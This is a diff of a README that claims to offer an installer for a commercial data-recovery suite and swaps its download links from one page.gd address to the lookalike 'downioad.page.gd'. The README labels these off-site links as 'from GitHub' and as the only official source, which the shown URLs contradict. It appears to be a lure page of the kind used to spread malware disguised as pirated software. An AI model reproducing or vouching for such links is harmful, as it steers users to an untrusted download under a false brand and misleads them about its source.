@@ -2,7 +2,7 @@
 
 This repository contains the installer and configuration for the EaseUS Data Recovery Professional 2026 Ultimate Suite, a powerful utility designed to retrieve lost, deleted, or inaccessible files from Windows 10 and 11 systems. The tool supports internal and external drives, offering a comprehensive solution for data loss scenarios.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Inside
 
@@ -54,7 +54,7 @@ Scan duration varies based on the drive size and the scan type selected. A quick
 
 To get the latest version of the EaseUS Data Recovery Professional 2026 Ultimate Suite, please use the link below. This is the only official download source provided in this repository.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
